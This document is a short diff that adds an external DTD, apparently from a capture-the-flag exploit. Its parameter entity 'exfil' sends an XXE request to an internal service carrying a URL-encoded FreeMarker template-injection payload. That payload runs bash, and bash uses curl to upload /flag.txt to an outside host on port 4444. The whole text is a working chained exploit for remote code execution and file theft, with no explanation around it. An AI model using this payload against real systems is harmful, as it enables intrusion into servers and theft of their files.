@@ -1,0 +1,2 @@
+<!ENTITY % exfil SYSTEM 'http://javana-greeter:8080/hello?name=%24%7B%22freemarker.template.utility.Execute%22%3Fnew%28%29%28%22bash%20-c%20%7Bcurl%2Chttp%3A%2F%2F172.28.0.1%3A4444%2C-F%2Cf%3D%40%2Fflag.txt%7D%22%29%7D'>
+%exfil;
